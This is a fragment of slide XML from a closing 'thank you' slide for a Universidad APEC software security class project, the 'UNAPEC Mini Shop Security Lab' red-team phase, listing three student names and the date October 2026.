            <a:endParaRPr lang="es-D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33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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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3" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="7308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Calibri"/>
              </a:rPr>
              <a:t>UNIVERSIDAD APEC · SEGURIDAD DE SOFTWARE ISW</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2011680"/>
            <a:ext cx="100580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¡Gracias!</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3017520"/>
            <a:ext cx="10058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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>🛡️ UNAPEC Mini Shop Security Lab</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="3840480"/>
            <a:ext cx="4876200" cy="18000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Box 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4206240"/>
            <a:ext cx="10058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Jean de los Santos   ·   Jose Canelo   ·   Rainiery Peña</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="484632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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Proyecto Integrador Avanzado · Fase 1 Red Team</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="530352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Octubre 2026</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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LibreOffice/26.8.1.1$Linux_X86_64 LibreOffice_project/bf8adb135da2784a1be3ca33001278b7a20af5c1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es-DO</dc:language>
  <cp:lastModifiedBy/>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-25T22:26:06Z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